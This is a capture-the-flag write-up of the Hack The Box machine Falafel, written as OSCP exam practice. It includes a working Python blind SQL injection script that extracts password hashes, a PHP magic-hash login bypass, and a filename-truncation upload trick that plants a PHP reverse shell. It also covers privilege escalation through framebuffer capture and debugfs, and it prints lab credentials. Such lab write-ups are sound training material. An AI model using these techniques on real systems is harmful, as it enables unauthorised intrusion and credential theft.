---
title:  "Hack The Box / Falafel"
date: 2020-02-01
tags: [Penetration Testing, Hacking, Hack The Box, Jeeves, OSCP, Offensive Security]
header: 
  image: "assets/images/falafel/falafel-header.png"
---
Falafel is our sixth machine in the OSCP list provided by [NetSec Focus](https://www.netsecfocus.com/)! This machine was quite exotic due to its vulnerabilities and privilege escalation. Definetely some advance knowledge about php, MySQl, and linux was required, but the most of the learning came from [ipssec's](https://www.youtube.com/watch?v=CUbWpteTfio&t=) video about solving this machine. I have to say that there were easier ways to do it, but I rather to make it manually to learn how some technologies work. This is the sixth blog before my third attempt to the OSCP exam, so let's get to it!

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/list.jpg" alt="nmap scan">


## Information Gathering

### Nmap Scan
So, we start with a nmap scan to check what ports are open and what services are running in this machine. 

```
nmap -sC -sV -p- -oN scan.nmap 10.10.10.73
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/nmap.png" alt="nmap scan">

Here we have two useful ports and services such as SSH running in port 22 and HTTP running in port 80. There is some information in port 80 from ```robots.txt``` where it disallows all entries with a ```.txt``` extension. So, we might want to specify the extension at the time to do directory brute force.

### Directory Brute Force
This is what we have in our browser for now.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/browser-capure.png" alt="nmap scan">

Running [dirsearch](https://github.com/maurosoria/dirsearch) we have some results!
```
./dirsearch.py -u http://10.10.10.73 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -f -e txt
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/dirsearch.png" alt="nmap scan">

Let's see what we find at ```http://10.10.10.73/cyberlaw.txt```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/cyberlaw.png" alt="nmap scan">

Great, seems that some of the vector attack is related with the upload feature, here there is a username which is chris, so let's find more usernames. 

### Username Brute Force with Wfuzz
[Wfuzz](https://github.com/xmendez/wfuzz) is a pretty handy tool that can be helpful for a variety of things. In this case let's use it to do some username brute force.
```
wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt -d "username=FUZZ&password=abcd" -u http://10.10.10.73/login.php --hh 7074
```
Where:
- ```-w``` specifies the wordlist.
- ```-d``` the parameter to brute force
- ```-u``` URL of the target
- ```-hh``` hide results with code 7074

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/wfuzz.png" alt="nmap scan">

So we have two valid users which are __chris and admin__.

### SQL Injection to Dump Hash From Database
We can dump the whole database using the powerfull [sqlmap](http://sqlmap.org/), but that's not the idea because the learning will be gone. What we do here is try to analize the HTTP request from the login page and try to find out the correct SQL sintax that will grant us the access. To do this, the usage of [BurpSuite](https://portswigger.net/burp/communitydownload) will be crucial. So let's get to it. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/correct-user.png" alt="nmap scan">

In the repeater from Burpsuite we see that once we go with the right username, we obtain in the response ```Wronf identification : admin``` and the size of the response is ```7,397``` bytes. Saying that, let's see how is the response if we go with the wrong user. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/wrong-user.png" alt="nmap scan">

Then, we see the response ```Try again...``` and the size of this response is ```7,376``` bytes. Now knowing the size of a correct and wrong response, let's try different SQL sintax to see if we get the correct one. 
- __Note:__ There were countless tries before attempting this were most of the SQL sintax came from [SecLists](https://github.com/danielmiessler/SecLists). Also keep in mind what kind of SQL database the target is using. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/sql-sintax.png" alt="nmap scan">

Knowing that the sintax gave us a positive answer and that the hash for admin starts with ```0e``` we can create a python script that will get the hash for us. Before this, get in mind the SQL sintax used. 
```
admin' and password like '0e%'-- -
```

#### Python Script
~~~python
import requests

chars = [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'] # Just hex characters.

def GetSQL(i,c): # Getting proper SQL sintax using the chars. 
    return "chris' and substr(password,%s,1) = '%s'-- -" % (i,c)

for i in range(1,33): # Try to discover the hash
    for c in chars:
        injection = GetSQL(i,c)
        payload = {'username':injection, 'password':'password'}
        r = requests.post('http://10.10.10.73/login.php', data = payload)
        if "Wrong identification" in r.text:
            print(c, end='',flush=True)
            break
print()
~~~

So, basically with this script we'll try all the characters untill one of the gets the correct answer which is ```Wrong identification``` then it prints the correct character untill we got the final hash. Here, we're specifying the user ```chris``` but we can do it with the user ```admin``` as well. This is the hash that has been gotten from ```chris```.

- __chris' hash:__ d4ee02a22fc872e36d9e3751ba72ddc8

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/hash-gotten.png" alt="nmap scan">

Once the hash has been gotten, we go to [CrackStation](https://crackstation.net/) and this is the result. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/hash-cracked.png" alt="nmap scan">

Which menas ```chris:juggling```, and this is what we get once we log in. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/chris-login.png" alt="nmap scan">

Interesting, but no upload feauture, let's try with ```admin```.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/admin-hash.png" alt="nmap scan">

So this is the has gotten for ```admin``` user: 0e462096931906507119562988736854. And unfortunately __there is no results in CrackStation__, so looking for more resources, it seems to be some kind of php juggling, so for this we might google something like ```php 0e hash collision``` and we'll see that we can log in with a md5 hash where in this case we used this ```240610708``` and we are in.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/upload-feauture.png" alt="nmap scan">

and wolah! Here it is the upload feature!

### Reverse Shell

Here is where another countless attempts came. So, there was only attempts to upload images then I tried everything including [exiftool](https://exiftool.org/) to get a reverse shell, but I was not looking at the big picture wich was [wget](https://www.gnu.org/software/wget/) and its limit for characters. So, googling ```maximum character length accepted by wget``` it came with this answer. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/wget-lenght.png" alt="nmap scan">

Then it's only accepted character where its name is under 255 characters. Then let's see how it can be shorter with our target. Let's create a pattern and see how it affects. 
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50
```
after obtaining our answer we might delete 4 character in order to put our extension for images which is ```.gif``` and try to see how it goes. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/maximum.png" alt="nmap scan">

And this is the new lenght gotten from the from Falafel. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/new-lenght.png" alt="nmap scan">
 
 So, let's count it!

 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/count-new-lenght.png" alt="nmap scan">

 Once we upload the file they make it shorter to 236 character, so we might add 4 characters more in order to make it 240 so we can uploaded in image for and when it gets shorter is going to be our php reverse shell. 
 - Example: 
    - Before uploading = .php.gif
    - After uplpadeing = .php (because of the 4 bytes shorter)

So, let's set up our python HTTP server and upload our reverse shell gotten from [PentestMonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell). So this is before uploading.

 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/before-shell.png" alt="nmap scan">

This is the size and the extension ```.php``` after it was uploaded and shorter. 

 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/before-shell-2.png" alt="nmap scan">

And we go to the directory where it was uploaded, we got a shell!

 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/shell-gotten.png" alt="nmap scan">

### Privilege Escalation

#### Getting Moshe
To get the user moshe from our target machine is quite surprising because we can find the credentials at ```/var/www/html/connection.php```, as we are ```www-data``` by default we landed in this folder this time. 

 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/creds-found.png" alt="nmap scan">

and get can get to Moshe just as ```su moshe``` and providing the credentials founded. 

### User flag

Going to ```/home/moshe``` and finding ```user.txt```, we got user flag!

 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/user-flag.png" alt="nmap scan">

### Getting Yossi

So, according in the picture above looks like we are in the video groups which allow us to see current screenshots from other users, in this case Yossi. So moving to ```/dev/fb0``` and transfering it to our localhost as ```fb.data``` we might get a picture of what's going on.

 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/nc-transfer.png" alt="nmap scan">

So, opening this file in [Gimp](https://www.gimp.org/) and adjusting the size widht to 764 pixels, we see that Yossi was trying to change the password, and her password is ```MoshePlzStopHackingMe!```.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/yossi.png" alt="nmap scan">

And we log in as ```su yossi``` with her password which is ```MoshePlzStopHackingMe!```. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/yossi-gotten.png" alt="nmap scan">

### Getting Root

According the picture above, looks like Yossi extrangely is the groups disk which allows to read the disk from different users including sudo, then there is a handy tool for this action called [debugfs](https://linux.die.net/man/8/debugfs).
```
debugfs /dev/sda1
```
Once the command is executed we can execute commands as we were root, but we're not, yet. Then here we see the root directory!

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/debug.png" alt="nmap scan">

we get in the root folder and we can also get the root flag! But the main idea is to get the root flag from a root shell.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/debug-root-flag.png" alt="nmap scan">

To get in as root we might find a id_rsa key located at ```/root/.ssh```. Then we can copy, paste and give permissions from our localhost and get root!

### Root Flag

So, we pass the rsa key name ```id_rsa``` and we log in ssh and we got the flag and root shell!

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/proper-shell.png" alt="nmap scan">

System owned :)

## To conclude
It was quite interesting to see how the SQL sintax worked and how password brute force won't be always a solution. Also, some files in the system might contain important information and that the groups assigned to the users matter! Definetely, it was a fun box.